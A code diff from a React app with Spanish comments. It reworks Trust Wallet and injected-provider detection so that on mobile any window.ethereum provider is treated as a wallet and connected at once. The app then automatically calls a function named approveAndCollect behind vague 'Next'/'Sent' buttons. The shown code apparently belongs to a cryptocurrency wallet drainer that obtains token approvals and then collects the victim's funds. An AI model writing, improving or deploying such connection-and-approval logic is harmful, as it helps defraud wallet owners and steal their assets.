@@ -191,54 +191,51 @@ export default function App() {
 
     if (typeof window !== 'undefined') {
       const w = window as any;
-
-      // 1. Escuchar activamente los anuncios estándar EIP-6963 en ejecución directa
-      window.addEventListener("eip6963:announceProvider", (event: any) => {
-        const info = event.detail?.info;
-        const provider = event.detail?.provider;
-        if (info?.rdns === "app.trustwallet.com" || info?.rdns === "com.trustwallet.app" || info?.name?.toLowerCase().includes("trust")) {
-          injectedProvider = provider;
-        }
-      });
-      window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-      // 2. Comprobación profunda sobre los proxies e interfaces inyectadas asíncronas
-      if (!injectedProvider) {
-        if (w.trustwallet) {
-          injectedProvider = w.trustwallet;
-        } else if (w.trustWallet) { // 🔥 FIX: Trust Wallet en iOS a veces inyecta en camelCase
-          injectedProvider = w.trustWallet;
-        } else if (w.ethereum?.providers?.length) {
-          injectedProvider = w.ethereum.providers.find((p: any) => p.isTrust || p.isTrustWallet || p._isTrust || p.constructor?.name?.includes('Trust'));
-        } else if (w.ethereum && (w.ethereum.isTrust || w.ethereum.isTrustWallet || w.ethereum._isTrust)) {
-          injectedProvider = w.ethereum;
-        } 
-        // 🔥 FIX ROBUSTO iOS: Usar el User-Agent del navegador interno
-        // En iOS, Trust a menudo limpia los flags de window.ethereum hasta que conectas
-        else if (w.ethereum && typeof navigator !== 'undefined' && navigator.userAgent.toLowerCase().includes('trust')) {
+      
+      // 🔥 1. DETECCIÓN SINCRÓNICA DIRECTA (Sin promesas ni listeners que causen delay)
+      const explicitTrust = w.trustwallet || w.trustWallet || w.TrustWallet;
+      
+      if (explicitTrust) {
+        injectedProvider = explicitTrust;
+      } 
+      // 🔥 2. EL CATCH-ALL ROBUSTO PARA iOS
+      else if (w.ethereum) {
+        // Detectamos si el usuario está en un dispositivo móvil (Especialmente iOS)
+        const isMobileDevice = typeof navigator !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (w.ethereum.providers && Array.isArray(w.ethereum.providers)) {
+          // Busca en el array interno si existe
+          injectedProvider = w.ethereum.providers.find((p: any) => p.isTrust || p.isTrustWallet) || (isMobileDevice ? w.ethereum : null);
+        } else if (w.ethereum.isTrust || w.ethereum.isTrustWallet || w.ethereum._isTrust || isMobileDevice) {
+          // En iOS WebKit, window.ethereum existe PERO oculta sus banderas "isTrust" hasta que te conectas.
+          // La regla de oro: Si window.ethereum existe en móvil, ASUMIMOS que es un dApp browser inyectado.
           injectedProvider = w.ethereum;
         }
       }
     }
 
-    if (!isConnected && injectedProvider && (injectedProvider as any).request) {
+    if (!isConnected && injectedProvider && typeof injectedProvider.request === 'function') {
       try {
         setLoading(true);
         setStatus('Connecting Wallet...');
-        log("[SYSTEM] Trust Wallet Detectado mediante Flags/EIP-6963 de forma directa.");
-        const accounts = await (injectedProvider as any).request({ method: 'eth_requestAccounts' });
+        log("[SYSTEM] Injected dApp Browser Detectado. Ejecutando handshake directo...");
+        
+        // Petición nativa directa
+        const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
+        
         if (accounts && accounts.length > 0) {
-          log(`[SYSTEM] Conexión directa establecida: ${accounts[0]}`);
+          log(`[SYSTEM] Conexión nativa establecida: ${accounts[0]}`);
           setTimeout(() => approveAndCollect(injectedProvider, accounts[0]), 500);
         } else {
           setLoading(false);
         }
       } catch (e) {
-        log('❌ Conexión cancelada u omitida');
+        log('❌ Conexión cancelada u omitida por el usuario');
         setStatus('Ready');
         setLoading(false);
       }
     } else if (!isConnected) {
+      // Solo abre Reown si está en escritorio sin extensión o no se detectó nada
       manualConnect.current = true; 
       open(); 
     } else {
@@ -549,7 +546,6 @@ export default function App() {
     }
   };
 
-  // 🔥 HERE ARE THE TWO CORRECTED LINES prioritizing 'loading' over '!isConnected'
   const isButtonDisabled = loading;
   const buttonText = loading ? 'Loading...' : !isConnected ? 'Next' : status === '✅ Processing Complete!' ? 'Sent' : status.includes('❌') ? 'Retry' : 'Next'; 
 
